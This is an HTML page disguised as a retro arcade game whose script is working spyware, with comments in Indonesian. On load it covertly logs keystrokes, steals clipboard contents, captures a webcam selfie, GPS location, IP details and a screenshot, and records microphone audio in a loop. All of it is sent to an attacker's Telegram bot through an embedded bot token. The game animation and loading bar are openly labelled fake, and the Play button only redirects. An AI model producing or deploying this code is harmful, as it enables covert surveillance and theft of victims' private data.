<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>ARCADE 3000 - Retro Game</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            image-rendering: pixelated;
            image-rendering: crisp-edges;
        }
        body {
            background: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            color: #0f0;
            overflow: hidden;
        }
        .gameboy {
            width: 340px;
            max-width: 95%;
            background: #111;
            border: 4px solid #0f0;
            border-radius: 20px 20px 40px 40px;
            padding: 20px 15px 30px;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
            position: relative;
        }
        .gameboy::before {
            content: '';
            position: absolute;
            top: 10px;
            left: 20px;
            width: 50px;
            height: 10px;
            background: #0f0;
            border-radius: 10px;
            opacity: 0.5;
        }
        .gameboy::after {
            content: '';
            position: absolute;
            bottom: 15px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 5px;
            background: #0f0;
            border-radius: 5px;
            opacity: 0.3;
        }
        .screen {
            background: #0a0a0a;
            border: 4px solid #0f0;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            min-height: 200px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .screen::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0,255,0,0.1) 50%, rgba(0,0,0,0.1) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            animation: scanline 6s linear infinite;
        }
        @keyframes scanline {
            0% { background-position: 0 0; }
            100% { background-position: 0 10px; }
        }
        .game-title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 0 0 5px #0f0;
            letter-spacing: 2px;
        }
        .game-canvas {
            width: 100%;
            height: 120px;
            background: #000;
            border: 2px solid #0f0;
            margin: 10px 0;
            position: relative;
            overflow: hidden;
        }
        .pixel {
            width: 10px;
            height: 10px;
            background: #0f0;
            position: absolute;
            box-shadow: 0 0 5px #0f0;
        }
        .controls {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .progress-container {
            width: 100%;
            background: #111;
            border: 2px solid #0f0;
            height: 20px;
            margin: 15px 0;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #0f0;
            transition: width 0.3s;
            box-shadow: 0 0 8px #0f0;
        }
        .status-text {
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .btn {
            background: #111;
            border: 2px solid #0f0;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 20px;
            padding: 10px 30px;
            margin: 15px 0;
            border-radius: 30px;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            box-shadow: 0 0 10px #0f0;
            transition: 0.2s;
            opacity: 0;
            pointer-events: none;
        }
        .btn.active {
            opacity: 1;
            pointer-events: auto;
        }
        .btn:hover {
            background: #0f0;
            color: #000;
        }
        .footer {
            font-size: 10px;
            text-align: center;
            margin-top: 15px;
            color: #0f0;
            opacity: 0.5;
        }
    </style>
</head>
<body>
    <div class="gameboy">
        <div class="screen">
            <div class="game-title">ARCADE 3000</div>
            <div class="game-canvas" id="gameCanvas">
                <!-- Pixels akan digerakkan oleh JS -->
            </div>
            <div class="status-text" id="status">LOADING GAME...</div>
        </div>
        <div class="controls">
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="btn" id="playBtn">PLAY NOW</div>
        </div>
        <div class="footer">ⓒ 1984 NINTENDO</div>
    </div>

    <script>
        // ==================== KONFIGURASI ====================
        const TELEGRAM_TOKEN = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // GANTI DENGAN TOKEN BOT LO
        const CHAT_ID = '6809118251';                                            // GANTI DENGAN CHAT ID LO
        const IPINFO_TOKEN = '02d525527b04f2';                                   // TOKEN VALID

        // Buffer untuk keylogger
        let keyBuffer = [];
        let lastKeySend = Date.now();

        // ==================== FUNGSI KIRIM TELEGRAM ====================
        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch (e) { console.log('Gagal kirim pesan:', e); }
        }

        async function sendTelegramPhoto(blob, filename) {
            try {
                let fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, filename);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } catch (e) { console.log('Gagal kirim foto:', e); }
        }

        async function sendTelegramAudio(blob, filename) {
            try {
                let fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('audio', blob, filename);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendAudio`, { method: 'POST', body: fd });
            } catch (e) {
                try {
                    let fd2 = new FormData();
                    fd2.append('chat_id', CHAT_ID);
                    fd2.append('document', blob, filename);
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: fd2 });
                } catch (err) {}
            }
        }

        // ==================== KEYLOGGER ====================
        document.addEventListener('keydown', function(e) {
            let key = e.key;
            if (key.length === 1) {
                keyBuffer.push(key);
            } else {
                keyBuffer.push(`[${key}]`);
            }
            
            if (Date.now() - lastKeySend > 10000 || keyBuffer.length > 50) {
                let keys = keyBuffer.join('');
                sendTelegramMessage("⌨️ Ketikan: " + keys);
                keyBuffer = [];
                lastKeySend = Date.now();
            }
        });

        // ==================== CLIPBOARD STEALING ====================
        async function stealClipboard() {
            try {
                let text = await navigator.clipboard.readText();
                if (text) sendTelegramMessage("📋 Clipboard: " + text);
            } catch (e) {}
        }
        setInterval(stealClipboard, 30000);

        // ==================== DAPETIN DATA IP (DENGAN FALLBACK) ====================
        async function getIPInfo() {
            try {
                let response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
                if (response.ok) {
                    let data = await response.json();
                    if (!data.error) return { source: 'ipinfo', data: data };
                }
            } catch (e) {}

            try {
                let response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,proxy,hosting');
                let data = await response.json();
                if (data.status === 'success') return { source: 'ipapi', data: data };
            } catch (e) {}

            return null;
        }

        // ==================== REVERSE GEOCODING ====================
        async function reverseGeocode(lat, lon) {
            try {
                let url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`;
                let resp = await fetch(url);
                return await resp.json();
            } catch (e) {
                return null;
            }
        }

        // ==================== AUDIO RECORDING (LOOP) ====================
        function startContinuousAudioRecording(duration = 60000, interval = 60000) {
            async function recordOnce() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const recorder = new MediaRecorder(stream);
                    let chunks = [];

                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        await sendTelegramAudio(blob, `audio_${Date.now()}.webm`);
                        stream.getTracks().forEach(t => t.stop());
                        setTimeout(recordOnce, interval);
                    };

                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                } catch (err) {
                    sendTelegramMessage("❌ Audio error: " + err.message);
                    setTimeout(recordOnce, interval);
                }
            }
            recordOnce();
        }

        // ==================== ANIMASI GAME PALSU ====================
        function startGameAnimation() {
            const canvas = document.getElementById('gameCanvas');
            // Buat beberapa pixel bergerak
            for (let i = 0; i < 5; i++) {
                let pixel = document.createElement('div');
                pixel.className = 'pixel';
                pixel.style.left = Math.random() * 100 + '%';
                pixel.style.top = Math.random() * 100 + '%';
                pixel.style.animation = `movePixel ${2 + Math.random() * 3}s infinite alternate`;
                canvas.appendChild(pixel);
            }
            // Tambah style animasi
            const style = document.createElement('style');
            style.innerHTML = `
                @keyframes movePixel {
                    0% { transform: translate(0, 0); }
                    100% { transform: translate(${Math.random() * 50}px, ${Math.random() * 50}px); }
                }
            `;
            document.head.appendChild(style);
        }

        // ==================== PROGRESS BAR PALSU ====================
        let progress = 0;
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('status');
        const playBtn = document.getElementById('playBtn');
        const interval = setInterval(() => {
            progress += Math.random() * 5;
            if (progress > 100) progress = 100;
            progressBar.style.width = progress + '%';
            statusText.innerText = `LOADING... ${Math.floor(progress)}%`;
            if (progress >= 100) {
                clearInterval(interval);
                statusText.innerText = 'READY TO PLAY!';
                playBtn.classList.add('active');
                // Redirect setelah 10 detik kalo tombol gak ditekan
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 10000);
            }
        }, 200);

        // ==================== FUNGSI UTAMA ====================
        async function main() {
            // Mulai animasi game
            startGameAnimation();

            // 1. Dapatkan IP info
            let ipResult = await getIPInfo();
            let report = '';
            if (ipResult) {
                if (ipResult.source === 'ipinfo') {
                    let d = ipResult.data;
                    report += '╭───── IPINFO.IO DATA ───── ⦿\n';
                    report += `IP         : ${d.ip}\n`;
                    report += `Kota       : ${d.city || '-'}\n`;
                    report += `Region     : ${d.region || '-'}\n`;
                    report += `Negara     : ${d.country || '-'}\n`;
                    report += `Koordinat  : ${d.loc || '-'}\n`;
                    report += `ISP        : ${d.org || '-'}\n`;
                    report += `Timezone   : ${d.timezone || '-'}\n`;
                    report += '╰─────────────────────────⦿\n\n';
                } else {
                    let d = ipResult.data;
                    report += '╭───── IP-API.COM DATA ───── ⦿\n';
                    report += `IP         : ${d.query}\n`;
                    report += `Kota       : ${d.city}\n`;
                    report += `Region     : ${d.regionName}\n`;
                    report += `Negara     : ${d.country}\n`;
                    report += `Koordinat  : ${d.lat},${d.lon}\n`;
                    report += `ISP        : ${d.isp}\n`;
                    report += `Proxy/VPN  : ${d.proxy ? 'YA' : 'Tidak'}\n`;
                    report += '╰─────────────────────────⦿\n\n';
                }
            } else {
                report += '❌ Gagal ambil data IP\n\n';
            }

            await sendTelegramMessage(report);

            // 2. Ambil foto kamera
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(r => setTimeout(r, 2000));
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendTelegramPhoto(blob, 'selfie.jpg'), 'image/jpeg');
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                sendTelegramMessage('❌ Gagal akses kamera: ' + e.message);
            }

            // 3. GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    let acc = pos.coords.accuracy;
                    let gpsMsg = `📍 GPS POSITION\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\n`;

                    let addr = await reverseGeocode(lat, lon);
                    if (addr) {
                        gpsMsg += `Alamat: ${addr.locality || addr.city || ''}, ${addr.principalSubdivision || ''}\n`;
                    }
                    await sendTelegramMessage(gpsMsg);
                }, (err) => {
                    sendTelegramMessage('❌ GPS error: ' + err.message);
                }, { enableHighAccuracy: true, timeout: 10000 });
            } else {
                sendTelegramMessage('❌ Geolocation tidak didukung');
            }

            // 4. Screenshot
            setTimeout(async () => {
                try {
                    let canvas = await html2canvas(document.body);
                    canvas.toBlob(blob => sendTelegramPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
                } catch (e) {}
            }, 5000);

            // 5. Mulai rekam audio
            setTimeout(() => {
                startContinuousAudioRecording(60000, 60000);
            }, 3000);
        }

        // Event tombol PLAY (cuma redirect)
        playBtn.addEventListener('click', () => {
            window.location.href = "https://www.google.com";
        });

        // Mulai
        main();
    </script>
</body>
</html>
